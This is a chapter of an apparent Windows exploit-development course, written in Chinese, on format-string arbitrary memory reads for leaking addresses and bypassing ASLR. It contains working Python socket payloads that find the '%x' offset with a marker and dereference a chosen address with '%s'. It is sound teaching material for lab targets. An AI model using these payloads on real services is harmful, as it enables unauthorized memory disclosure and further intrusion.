# Ch 35 — 任意讀：leak 記憶體 / 繞 ASLR

> **目標**：把 Ch 34 的原理變成操作流程——用 `%x` 定位 offset（找出「第幾個格式指定符對應到攻擊者自己送入的 buffer」），再用 `%s` 把 buffer 裡放的任意位址解參考讀出來，實現「任意記憶體讀取」。把讀到的結果拿去繞過 Ch 31–33 的 ASLR。

> **環境**：Win10 x64 + WinDbg（2026）+ Python 3

## 為什麼需要這一章

Ch 34 講完原理：`printf(user_input)` 讓攻擊者能決定讀幾個 slot、用什麼指定符讀。但原理本身還不是武器——光是印出一堆 `%x` 撈到的隨機數字，對 exploit 沒有直接幫助。要把這個原理變成有用的 primitive（基礎利用元件），需要兩個關鍵步驟：

1. **定位**：攻擊者送入的資料（通常也是放在同一個 buffer 裡，和 format string 字串本身共用記憶體）其實也躺在 stack 的某個位置上，會被某一輪 `%x` 撈到。找出「第幾輪」就是 **offset**。
2. **解參考**：知道 offset 之後，攻擊者就能精準控制「`%s` 會去讀哪個位址」——因為那個位址值，就是攻擊者自己放進 buffer 裡的內容。

這一章把這兩步講透，目標是任意讀（arbitrary read）：給定一個你想知道內容的位址，透過 format string 把它的記憶體內容 leak 出來。這是繞過 ASLR（Ch 31–33）最乾淨的手法之一——不需要依賴「某個模組沒隨機化」這種運氣，直接讀出任何已載入模組或 stack 的實際位址。

## 先建立直覺：offset 是什麼

把攻擊 payload 想成兩塊：**format string 部分**（一串 `%x`）和 **資料部分**（攻擊者放的標記值，之後會換成真正的位址）。這兩塊常常是同一個 `recv` buffer 裡的同一段資料，只是前半段被 `printf` 當格式解析、後半段被當成「待撈取的引數」——但它們物理上根本是同一塊記憶體，只是 `printf` 從兩個不同角度看它。

```
攻擊者送入的 buffer（同一塊記憶體）：

┌────────────────────────────┬───────────────┐
│  "%x.%x.%x.%x.%x.%x.%x.%x" │  "AAAA"       │
│  ← printf 當成 format 解析  │  ← 標記值，之後 │
│     （決定要撈幾個、怎麼撈） │     也會被某一輪 │
│                            │     %x 撈到     │
└────────────────────────────┴───────────────┘

printf(buf) 執行時，stack 上從 buf 指標往高位址方向數下去，
會先經過其他和這次呼叫無關的殘餘資料，「可能」也會經過 buf 本身
（如果 buf 存在 stack 上，而不是 heap），視目標程式的區域變數排列而定。
```

**關鍵技巧**：讓資料部分放一個容易辨認、幾乎不會「自然出現」在記憶體裡的標記值，例如 `"AAAA"`（ASCII `0x41414141`）。然後送出一串 `%x`（例如 20 個，用 `.` 分隔方便肉眼辨識每一輪印出的值），觀察輸出——哪一輪印出了 `41414141`，那一輪的序號就是 offset。

```
範例輸出（假設第 7 輪 %x 印出了 41414141）：

1a2b3c4d.00000000.7ffd1234.0012fe88.41414141.004f1020.00000001....
                                      ↑
                               第 5 輪？數清楚每個 . 分隔的區塊
```

實務上數到第幾輪容易肉眼算錯，建議寫腳本自動比對每一輪輸出是不是等於 `41414141`，而不是手算。

## 定位 offset 的完整流程

### 步驟 1：送入標記 + 一串 %x，找出大致範圍

```python
#!/usr/bin/env python3
import socket

target_ip, target_port = "192.168.x.x", 9999

marker = b"AAAA"                      # 0x41414141，標記值
fmt    = b".%x" * 20                  # 20 輪 %x，用 . 分隔方便切割
payload = marker + fmt

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload + b"\r\n")
resp = s.recv(4096)
s.close()
print(resp)
```

### 步驟 2：找出 41414141 出現在第幾輪

```python
# 假設 resp 裡夾著類似 b".1a2b3c4d.41414141.004f1020..." 的輸出
parts = resp.split(b".")
for i, p in enumerate(parts):
    if p == b"41414141":
        print(f"[+] offset 可能是第 {i} 輪 %x")
```

> **未實測**：上述腳本邏輯基於 format string 定位 offset 的標準方法（Corelan 系列、scut 原始論文皆有描述），但實際輸出格式（服務怎麼把 `printf` 的結果回傳給攻擊機，是不是直接回顯 stdout）**依目標程式而定**——有些服務直接把 `printf` 寫到 socket，有些只內部記 log 不回顯，這種情況就需要搭配 WinDbg 在記憶體裡直接觀察 `%n` 寫入結果或配合崩潰位置判斷，而非依賴回顯。本章假設的是「目標會把格式化後的字串回顯給攻擊者」這種最常見、也最適合教學的情境；驗證請在你自己的靶機上以 WinDbg 單步觀察 `printf` 呼叫前後的 stack，核對哪一個 slot 真的對應到你送入的標記。

### 步驟 3：驗證 offset——換一個獨特標記重新確認

找到「看起來是第 N 輪」之後，務必用**不同的標記值**重送一次驗證，避免巧合（stack 上殘留資料剛好也等於 `0x41414141` 的機率雖低但不是零，尤其在重複測試、前一次連線留下殘骑的情況下）：

```python
marker2 = b"BBBB"                     # 0x42424242
payload2 = marker2 + b".%x" * 20
# 重送，確認 41414141 的輪數換成了 42424242，且輪數不變
```

兩次標記都落在同一輪，offset 才算確認。這一步在 OSED 的評分邏輯裡很重要——「有沒有可靠地定位、有沒有驗證」比「這次剛好跑出來」更能說明你真的理解漏洞，而不是瞎子摸象。

## %N$ 直接定位（位置參數，若目標 CRT 支援）

如果目標的 CRT 支援 `%N$x`（direct parameter access，直接指定要讀第幾個引數），可以跳過逐輪掃描，直接用二分法或線性嘗試去猜 offset：

```python
for n in range(1, 30):
    payload = marker + f"%{n}$x".encode()
    # 送出，觀察輸出是否為 41414141
```

> **未實測，以目標 CRT 實測為準**：Ch 34 已標注 Windows CRT 對 `%N$` 的支援不一致（不同 MSVCRT/UCRT 版本行為可能不同，甚至不支援）。遇到實際目標時，先用最笨的逐輪 `%x` 方法確認 offset 可行，再嘗試 `%N$` 是否真的被目標的 `printf` 實作接受——不要預設它一定能用，也不要在不確定的情況下只用這個方法而沒有備援。

## 核心技巧：把 offset 位置換成「想讀的位址」，用 %s 解參考

定位出 offset（假設是第 7 輪）之後，接下來的目標是：讓第 7 個 slot 的值變成「我想 leak 的位址」，然後第 7 輪用 `%s` 而不是 `%x`。

```
payload 設計：

┌───────────────────────┐
│  目標位址（4 bytes，    │  ← 這會被 printf 當成某一輪的 slot 值
│  little-endian）        │     （放在 buffer 最前面，確保它在 stack 上
│  例如 \x00\x10\x4f\x00  │     的位置排在前幾個引數的位置）
├───────────────────────┤
│  "%x.%x.%x.%x.%x.%x.%s" │  ← 前 6 輪佔位撈掉無關資料，
│                         │     第 7 輪用 %s 解參考「目標位址」
└───────────────────────┘
```

```python
#!/usr/bin/env python3
import socket, struct

target_ip, target_port = "192.168.x.x", 9999
offset = 7                            # 由前面的定位流程得出

leak_addr = 0x004f1020                # 想 leak 的位址（例如某模組的 .data 區）
addr_bytes = struct.pack("<I", leak_addr)

fmt = b"%x." * (offset - 1) + b"%s"   # 前 offset-1 輪佔位，最後一輪用 %s
payload = addr_bytes + fmt

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(payload + b"\r\n")
leaked = s.recv(4096)
s.close()
print("[+] leaked data:", leaked)
```

> **未實測，理論預期**：此腳本的位址排列與輪數計算依照 Ch 34 的 cdecl stack 模型推導，實際是否「剛好第 offset 輪對應到 `addr_bytes` 所在的 4 bytes」取決於 `addr_bytes` 在 buffer 裡的確切位置是否和定位 offset 時用的標記值位置一致（兩者都在 buffer 最前面、長度都是 4 bytes，理論上應該對齊）。驗證方法：在 WinDbg 裡對目標函式的 `printf`/`sprintf` 呼叫點下斷點，`dd esp` 看呼叫瞬間的 stack 內容，核對第 offset 個 4-byte slot 確實就是你放入的 `addr_bytes`，再放行觀察 `%s` 解參考的結果是否正確。

## 底層機制：為什麼這能繞過 ASLR

ASLR（Ch 31）讓每次程式啟動時，模組基址、stack 基址、heap 基址都被隨機打亂，攻擊者沒辦法硬編碼一個位址去猜 `jmp esp` 或 shellcode 位置。但 ASLR **不會**讓程式「不知道自己的位址」——程式執行期間，它自己的 code、data、stack 都是以某個（隨機化後）固定基址在跑，只是攻擊者事先不知道這個基址是多少。

Format string 的任意讀，本質是讓**程式自己把這個秘密告訴攻擊者**：

```
┌────────────────────────────────────────────────────┐
│  ASLR 隨機化後，程式實際跑在：                        │
│    模組基址 = 0x6f4a0000（這次啟動隨機決定的）         │
│    stack 基址 = 0x0012f000（這次啟動隨機決定的）       │
│                                                      │
│  format string 任意讀：                               │
│    用 %x 掃出 stack 上任何一個殘留的指標值              │
│    → 那個指標值本身就洩漏了「這次啟動的隨機基址」        │
│    → 用 %s 進一步讀出該位址附近的記憶體內容做二次確認    │
│                                                      │
│  攻擊者現在知道了這次啟動的實際基址，                    │
│  ASLR 的隨機化對這次攻擊已經失效                        │
└────────────────────────────────────────────────────┘
```

這和 Ch 32「info leak primitives」的思路完全一致——format string 只是製造 info leak 的其中一種手法（相對於部分覆寫 return address 猜測、或依賴非隨機化模組）。拿到 leak 之後，接 Ch 33 的「ASLR+DEP 合體完整鏈」流程：算出 kernel32/ntdll 等模組的實際基址，動態計算 `VirtualProtect`/ROP gadget 的絕對位址。

## 對比：format string leak vs Ch 32 其他 info leak 手法

| 手法 | 依賴條件 | 可讀取範圍 | 穩定性 |
|---|---|---|---|
| Format string `%x`/`%s` 任意讀 | 目標有 `printf(user_input)` 漏洞 | 幾乎任意位址（只要可讀） | 高——位址算對幾乎必中，不靠猜測 |
| 部分覆寫 + brute force | overflow 漏洞 + 部分位址可預測 | 受限於覆寫範圍附近 | 中——仍帶運氣成分 |
| 非隨機化模組（Ch 31） | 目標載入了未開 ASLR 的模組 | 僅該模組範圍 | 高但受限——該模組不存在就沒用 |

Format string 任意讀的優勢是**精確且範圍廣**——只要位址算對，`%s` 保證讀到；劣勢是**前提嚴格**——目標必須真的存在 `printf(user_input)` 這類漏洞，這在真實世界遠比 overflow 少見。

## 踩雷集錦

1. **offset 數錯一輪**：最常見的錯誤。務必用兩個不同標記值分別驗證，不要只跑一次就相信結果。
2. **`%s` 解參考到不可讀位址直接當機**：leak 位址算錯（例如基址算錯、或目標位址根本未對映），`%s` 會造成 access violation。先用 `%x` 確認該 slot 的值看起來像不像一個合理的指標（例如落在已知模組的位址範圍），再升級成 `%s`。
3. **誤把 `%x` 撈到的值直接當成「洩漏的位址」**：`%x` 印出的是 slot 的**原始值**，不是解參考後的內容。要讀「位址指向的內容」必須用 `%s`；要讀「位址本身」用 `%x`/`%p` 就夠了，兩者用途不同。
4. **標記值放的位置跟 offset 定位時不一致**：定位階段標記值放在 buffer 最前面，實際攻擊階段如果把要讀的位址放到 buffer 別的位置（例如中間、尾端），offset 可能整個對不上，必須重新定位或仔細對齊記憶體佈局。
5. **忽略 buffer 本身是否真的在 stack 上**：如果目標程式先把 `recv` 進來的資料複製到 heap 上的緩衝區，再拿去 `printf`，那麼「標記值會被某一輪 `%x` 撈到」這個假設可能不成立（heap 位址和 stack 上的 `printf` varargs 完全無關），這種情況需要先用 WinDbg 確認 buffer 實際存在哪裡。

## 進階：再往深一層

- **自動化 offset 掃描**：mona（Ch 0 已裝）雖然主要用在 overflow 的 pattern/offset，但同樣的「送標記、找位置」思路可以自己寫腳本自動化成二分搜尋，比線性逐輪掃描快很多，尤其輪數上百時。
- **多次 leak 拼接出完整模組基址**：單次 `%s` 洩漏的是某個位址「指向」的字串內容，如果目標位址本身存的是一個指標（例如 import table 裡的函式位址），兩次 leak（先讀出指標值，再用這個指標值當下一次要讀的位址）可以一路順著指標鏈走，這是進階 info leak 技巧的雛型，和堆積 exploit 裡的指標追蹤思路相通。
- **x64 情境下的對應手法（概念先行，Ch 40 詳述）**：x64 Windows 呼叫慣例前 4 個引數走暫存器，`printf` 的 varargs 實作仍需要把暫存器引數 spill 回 stack 供 `va_list` 遍歷，offset 計算方式不同於 x86，但「標記定位 → 控制 slot 值 → 用 %s 解參考」的核心思路不變。

## 本章重點整理

- Offset 定位：送入已知標記（如 `AAAA` = `0x41414141`）+ 一串 `%x`，找出標記出現在第幾輪，即為攻擊者可控 buffer 對應到的 `printf` 引數序號。
- 務必用第二個不同標記重新驗證 offset，避免巧合誤判。
- 任意讀：把 offset 位置的值換成「想讀的位址」，該輪用 `%s` 解參考讀出該位址的記憶體內容。
- `%N$`（位置參數）若目標 CRT 支援可加速定位，但**以目標實測為準**，不要預設可用。
- 任意讀是製造 info leak、繞過 ASLR 的乾淨手法之一：讓程式自己洩漏這次啟動的隨機基址,接續 Ch 33 的完整利用鏈。
- 全程理論推導標注為「未實測」的部分，實際驗證靠 WinDbg 在 `printf`/`sprintf` 呼叫點核對 stack 內容。

## 自我檢核

- [ ] 能說出定位 offset 的完整流程，以及為什麼要用兩個不同標記驗證
- [ ] 能解釋 `%x` 撈到的值和 `%s` 解參考出來的內容，兩者分別代表什麼
- [ ] 能畫出「標記值 payload」和「leak payload」在 stack 上的對應位置關係
- [ ] 能說出 format string 任意讀為什麼能繞過 ASLR，和 Ch 32 的其他 info leak 手法比較異同
- [ ] 知道 `%s` 解參考到不可讀位址會發生什麼，以及怎麼事先降低風險

## 延伸閱讀

- **"Exploiting Format String Vulnerabilities"** — scut / team teso
  - **讀哪裡**：第 4 節，關於用 `%x` 定位 offset 與用 `%s` 讀取任意記憶體的原始描述。
  - **學什麼**：本章定位流程與任意讀手法的理論源頭。
  - **前提**：以 Linux/glibc 為背景，位置參數語法部分需對照本章 Windows 的保留態度。

- **[`sprintf`, `_sprintf_l`, `swprintf`, ... — Microsoft Learn](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/sprintf-sprintf-l-swprintf-swprintf-l-swprintf-l)**
  - **讀哪裡**：格式指定符與回傳值段落。
  - **學什麼**：`%s`/`%x` 在 Windows CRT 的精確定義,包括錯誤處理方式(格式化失敗時的回傳值)。
  - **前提**：無。

- **[Connor McGarr — Exploit Development blog](https://connormcgarr.github.io/)**
  - **讀哪裡**：站內搜尋 info leak / ASLR bypass 相關文章。
  - **學什麼**：Windows 視角下 info leak 製造與利用的現代寫法，與本章「用 leak 繞 ASLR」的思路對照。
  - **前提**：先讀完 Ch 31–33 的 ASLR 基礎。

- **本課 [Ch 32 info leak 製造：部分覆寫、可預測位址](./32-info-leak-primitives.md)**
  - **讀哪裡**：整章,尤其是「info leak 的分類」段落。
  - **學什麼**：把 format string 任意讀放進 info leak 手法的全局地圖裡對照理解。
  - **前提**：無,本課內部章節,建議按順序已讀過。

- **[Corelan — Exploit Writing Tutorial 系列目錄](https://www.corelan.be/index.php/articles/)**
  - **讀哪裡**：系列目錄,搜尋與記憶體洩漏/ASLR 相關篇章。
  - **學什麼**：Corelan 一貫的「定位→驗證→利用」方法論,和本章流程結構一致。
  - **前提**：先掌握 Part 2 的 offset 定位基礎(cyclic pattern 的概念可和本章 offset 定位對照)。

下一章把「讀」升級成「寫」：用 `%n` 把控制流劫持到攻擊者手上。

→ [Ch 36 任意寫：%n 改寫導向 code exec](./36-format-string-arbitrary-write.md)
